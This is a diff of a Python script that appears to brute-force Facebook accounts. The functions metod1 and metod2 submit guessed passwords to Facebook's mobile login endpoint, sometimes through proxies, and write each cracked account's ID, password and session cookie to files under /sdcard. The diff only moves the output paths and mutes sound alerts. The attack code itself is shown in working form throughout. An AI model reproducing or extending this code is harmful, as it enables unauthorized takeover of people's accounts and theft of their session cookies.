@@ -505,8 +505,8 @@ def metod1(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				print(f'\r└── {kun}{idf}|{pw}\n{xxx}└── {mer}{ua}{xxx}')
-				os.popen('play-audio c.mp3')
-				open(f"CP/{self.hari_ini}.txt","a").write(f"{user}|{pw}\n")
+				#os.popen('play-audio c.mp3')
+				open('/sdcard/AKUN-CP/'+cph,'a').write(idf+'|'+pw+'\n')
 				cp+=1
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
@@ -514,8 +514,8 @@ def metod1(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				print(f'\r└── {hijo}{idf}|{pw}|{kuki}\n{xxx}└── {hijo}{ua}{xxx}')
-				os.popen('play-audio o.mp3')
-				open(f"OK/{self.hari_ini}.txt","a").write(f"{user}|{pw}\n")
+				#os.popen('play-audio o.mp3')
+				open('/sdcard/AKUN-OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 				break
 				
 			else:
@@ -543,8 +543,8 @@ def metod2(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				print(f'\r└── {kun}{idf}|{pw}\n{xxx}└── {mer}{ua}{xxx}')
-				os.popen('play-audio c.mp3')
-				open(f"CP/{self.hari_ini}.txt","a").write(f"{user}|{pw}|{cookie}\n")
+				#os.popen('play-audio c.mp3')
+				open('/sdcard/AKUN-CP/'+cph,'a').write(idf+'|'+pw+'\n')
 				cp+=1
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
@@ -552,8 +552,8 @@ def metod2(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				print(f'\r└── {hijo}{idf}|{pw}|{kuki}\n{xxx}└── {hijo}{ua}{xxx}')
-				os.popen('play-audio o.mp3')
-				open(f"OK/{self.hari_ini}.txt","a").write(f"{user}|{pw}\n")
+				#os.popen('play-audio o.mp3')
+				open('/sdcard/AKUN-OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 				break
 				
 			else:
@@ -564,11 +564,11 @@ def metod2(idf,pwv):
 
 ###----------#[ CREAT FILE ]#----------###
 def memulai():
-	try:os.mkdir('OK')
+	try:os.mkdir('/sdcard/AKUN-OK')
 	except:pass
-	try:os.mkdir('DUMP-FILE')
+	try:os.mkdir('/sdcard/DUMP-FILE')
 	except:pass
-	try:os.mkdir('CP')
+	try:os.mkdir('/sdcard/AKUN-CP')
 	except:pass
 	login_baz()
 if __name__=='__main__':
